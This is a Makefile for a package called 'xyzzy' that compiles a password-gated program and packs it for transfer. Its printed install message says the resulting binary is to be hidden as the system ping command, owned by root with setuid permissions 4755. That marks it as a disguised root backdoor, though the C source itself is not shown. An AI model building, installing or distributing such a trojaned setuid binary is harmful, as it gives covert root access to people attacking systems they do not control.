all: xyzzy

pass: pass.c
	$(CC) $(CFLAGS) -o pass pass.c

xyzzy: pass
	@echo ""
	@echo "     pass is the binary you hide as ping.  Make sure it's owned by root and"
	@echo "     has permissions set to 4755."
	@echo ""
	ln -sf pass xyzzy

makepass: makepass.c
	$(CC) $(CFLAGS) -o makepass makepass.c

tar.gz: clean
	(cd ..;tar -cvzf xyzzy.tar.gz xyzzy)
	mv ../xyzzy.tar.gz .

uuencode: tar.gz
	uuxfer -exyzzy.tar.gz xyzzy.uue
	rm xyzzy.tar.gz

clean:
	rm -f *.o makepass pass xyzzy 

distclean: clean
	rm xyzzy.tar.gz xyzzy.uue
